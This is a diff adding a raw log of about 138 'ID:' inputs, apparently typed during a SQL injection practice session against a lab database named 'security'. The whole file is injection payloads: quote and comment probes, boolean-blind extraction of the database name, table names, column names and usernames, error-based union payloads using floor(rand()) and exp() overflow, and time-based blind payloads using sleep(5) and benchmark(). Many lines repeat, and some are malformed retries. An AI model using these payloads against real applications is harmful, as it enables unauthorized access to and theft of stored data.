@@ -1,0 +1,138 @@
+ID:1
+ID:"
+ID:'
+ID:1"
+ID:1'
+ID:1'-- 
+ID:1'-- 
+ID:1'-- 
+ID:1'
+ID:1
+ID:1
+ID:1'-- 
+ID:1
+ID:1'and left(version(),1)=5#
+ID:1'and left(version(),1)=5#
+ID:1'and left(version(),1)=5#
+ID:1'and left(version(),1)=5#
+ID:1'and left(version(),1)=5#
+ID:1'and left(version(),1)=5#
+ID:1'and left(version(),1)=6#
+ID:1'and length(database())=8#
+ID:1'and length(database())=1#
+ID:1'and length(database())=2#
+ID:1'and length(database())=3#
+ID:1'and length(database())=4#
+ID:1'and length(database())=4#
+ID:1'and length(database())=4#
+ID:1'and length(database())=4#
+ID:'
+ID:1
+ID:1'and length(database())=4#
+ID:1'and length(database())=8#
+ID:1'and left(database(),1)>'a'-- 
+ID:1'and left(database(),1)>'a'-- 
+ID:1'and left(database(),1)>'a'-- 
+ID:1'and left(database(),1)>'a'-- 
+ID:1'and left(database(),1)>'a'-- 
+ID:1'and left(database(),1)>'r'-- 
+ID:1'and left(database(),1)>'r'-- 
+ID:1'and left(database(),1)>'s'-- 
+ID:1'and left(database(),1)>'s\'-- 
+ID:1'and left(database(),1)>'s'-- 
+ID:1'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>80-- 
+ID:1'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>80-- 
+ID:1'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>80 -- 
+ID:1'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>80 -- 
+ID:1'and ascii()>80-- 
+ID:1'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>80-- 
+ID:1'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>80-- 
+ID:1'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))>80-- 
+ID:1'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))>80-- 
+ID:1'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))>80-- 
+ID:1'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))>114-- 
+ID:1'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))>114-- 
+ID:1'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))>113-- 
+ID:1'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),2,1))>113-- 
+ID:1'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),2,1))>101-- 
+ID:1'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),2,1))>100-- 
+ID:1' and 1=(select 1 from information_schema.columns where table_name='users' and table_name regexp '^us[a-z]' limit 0,1)-- 
+ID:1' and 1=(select 1 from information_schema.columns where table_name='users' and table_name regexp '^us[a-z]' limit 0,1)-- 
+ID:1' and 1=(select 1 from information_schema.columns where table_name='users' and table_name regexp '^us[a-z]' limit 0,1)-- 
+ID:1' and 1= (select 1 from information_schema.columns where table_name='users' and table_name regexp '^us[a-z]' limit 0,1)-- 
+ID:1' and 1= (select 1 from information_schema.columns where table_name='users' and table_name regexp '^us[a-z]' limit 0,1)-- 
+ID:1' and 1=(select 1 from information_schema.columns where table_name='users' and column regexp('^user') limit 0,1)-- 
+ID:1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp('^user') limit 0,1)-- 
+ID:1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp('^user') limit 0,1)-- 
+ID:1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp('^user') limit 0,1)-- 
+ID:1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp('^us[a-z]') limit 0,1)-- 
+ID:1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp('^us[a-z]') limit 0,1)-- 
+ID:1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp('^us[a-z]') limit 0,1)-- 
+ID:1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp('^us[a-z]*') limit 0,1)-- 
+ID:1' and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68-- 
+ID:1' and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68-- 
+ID:1' and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68-- 
+ID:1' and ord(mid((select ifnull(cast(username as char),0x20) from security.users order by id limit 0,1),1,1))>87
+ID:1' and ord(mid((select ifnull(cast(username as char),0x20) from security.users order by id limit 0,1),1,1))>87
+ID:1' and ord(mid((select ifnull(cast(username as char),0x20) from security.users order by id limit 0,1),1,1))>87
+ID:1' and ord(mid((select ifnull(cast(username as char),0x20) from security.users order by id limit 0,1),1,1))>87-- 
+ID:1' and ord(mid((select ifnull(cast(username as char),0x20) from security.users order by id limit 0,1),1,1))>87-- 
+ID:1' and ord(mid((select ifnull(cast(username as char),0x20) from security.users order by id limit 0,1),1,1))=68-- 
+ID:1'
+ID:1'
+ID:1' and ord(min((select ifnull(cast(username as char),0x20) from security.users order by id desc limit 0,1)1,1))=68-- 
+ID:1' and ord(mid((select ifnull(cast(username as char),0x20) from security.users order by id desc limit 0,1)1,1))=68-- 
+ID:1' and ord(mid((select ifnull(cast(username as char),0x20) from security.users order by id desc limit 0,1)1,1))=68-- 
+ID:1' and ord(mid((select ifnull(cast(username as char),0x20) from security.users order by id desc limit 0,1)1,1))=68-- 
+ID:1' and ord(mid((select ifnull(cast(username as char),0x20) from security.users order by id desc limit 0,1),1,1))=68-- 
+ID:1' and ord(mid((select ifnull(cast(username as char),0x20) from security. order by id desc limit 0,1),1,1))=68-- 
+ID:1' and ord(mid((select ifnull(cast(username as char),0x20) from security. order by id desc limit 0,1),1,1))=68-- 
+ID:1' and ord(mid((select ifnull(cast(username as char),0x20) from security.users order by id desc limit 0,1),1,1))=68-- 
+ID:1' and ord(mid((select ifnull(cast(username as char),0x20) from security.users order by id% limit 0,1),1,1))=68-- 
+ID:1' and ord(mid((select ifnull(cast(username as char),0x20) from security.users order by id limit 0,1),1,1))=68-- 
+ID:1' union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a-- 
+ID:1' union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a-- 
+ID:1' union select (exp(~(select * FROM(SELECT USER())a))),2,3-- 
+ID:1' union select (exp(~(select * FROM(SELECT USER())a))),2,3-- 
+ID:1'and If(ascii(substr(database(),1,1))=115,1,sleep(5))-- 
+ID:1'and If(ascii(substr(database(),1,1))=115,1,sleep(5))-- 
+ID:1'and If(ascii(substr(database(),1,1))=115,1,sleep(5))-- 
+ID:1'and If(ascii(substr(database(),1,1))=115,1,sleep(5))-- 
+ID:1'and If(ascii(substr(database(),1,1))=117,1,sleep(5))-- 
+ID:1'and If(ascii(substr(database(),1,1))=115,1,sleep(5))-- 
+ID:1' and if(substr(database(),1,1)=115,1,sleep(5))-- 
+ID:1' and if(substr(database(),1,1)=115,1,sleep(5))-- 
+ID:1' and if(ord(substr(database(),1,1))=115,1,sleep(5))-- 
+ID:1' and if(ascii(substr(database(),1,1))=115,1,sleep(5))-- 
+ID:1'UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),null)),2,3 FROM (select database() as current) as tb1-- 
+ID:1'UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),null)),2,3 FROM (select database() as current) as tb1-- 
+ID:1'UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),null)),2,3 FROM (select database() as current) as tb1-- 
+ID:1'UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),null)),2,3 FROM (select database() as current) as tb1-- 
+ID:1'UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),null)),2,3 FROM (select database() as current) as tb1-- 
+ID:1'UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),null)),2,3 FROM (select database() as current) as tb1-- 
+ID:1'UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),null)),2,3 FROM (select database() as current) as tb1-- 
+ID:1'UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE('MS','by 5 seconds')),null)),2,3 FROM (select database() as current) as tb1-- 
+ID:1'UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE('MS','by 5 seconds')),null)),2,3 FROM (select database() as current) as tb1-- 
+ID:1' union select (if(substring(current,1,1)=char(115),benchmark(500000,encode('MSG','123')),null)),2,3 from (select database() as current) as tb1-- 
+ID:1' union select (if(substring(current,1,1)=char(115),benchmark(500000,encode('MSG','123')),null)),2,3 from (select database() as current) as tb1-- 
+ID:1' union select (if(substring(current,1,1)=char(115),benchmark(500000,encode('MSG','123')),null)),2,3 from (select database() as current) as tb1-- 
+ID:1' union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a-- 
+ID:1' union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a-- 
+ID:1' union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a-- 
+ID:1' union select (exp(~(select * FROM(SELECT USER())a))),2,3-- 
+ID:1' union select (exp(~(select * FROM(SELECT USER())a))),2,3-- 
+ID:1' union select (exp(~(select * FROM(SELECT USER())a))),2,3-- 
+ID:1
+ID:1
+ID:1' and asci()=86
+ID:1' and asci(substring((select database()),1,1))=86
+ID:1' and asci(substring((select database()),1,1))=86-- 
+ID:1' and ascii(substring((select database()),1,1))=86-- 
+ID:1' and if(ascii(substring((select database()),1,1))=86),null,sleep(5))-- 
+ID:1' and if(ascii(mid((select database()),1,1))=86),null,sleep(5))-- 
+ID:1' and if(ascii(mid((select database()),1,1))=86),null,sleep(5))-- 
+ID:1' and if(ascii(mid((select database()),1,1))=86),1,sleep(5))-- 
+ID:1' and if(ascii(mid((select database()),1,1))=86,1,sleep(5))-- 
+ID:1' and if(ascii(mid((select database()),1,1))=115,1,sleep(5))-- 
+ID:1' and if(ascii(mid((select database()),1,1))=115,1,sleep(5))-- 
+ID:1' and if(ascii(mid((select database()),1,1))=115,1,sleep(5))-- 
